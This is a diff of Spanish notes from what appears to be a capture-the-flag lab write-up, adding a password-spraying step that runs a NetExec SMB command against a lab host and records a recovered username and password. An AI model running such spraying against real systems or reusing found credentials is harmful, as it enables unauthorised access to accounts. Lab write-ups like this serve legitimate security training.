@@ -137,5 +137,16 @@ Para ver si son susceptibles los usuarios a este ataque
 Vemos que no son susceptibles
 
 ## Password spraying
-Con la contraseña que hemos obtenido del `.txt` en [[#SMB (139, 445)]] y los usuarios con [[#]]
+
+Con la contraseña que hemos obtenido del `.txt` en [[#SMB (139, 445)]] y los usuarios con [[#Enumeración de usuarios validos]]
+`nxc smb 10.129.231.149 -u users.txt -p passwords`
+
+Obtemos las siguientes credenciales
+```ad-hint
+michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
+```
+
+
+
+
 
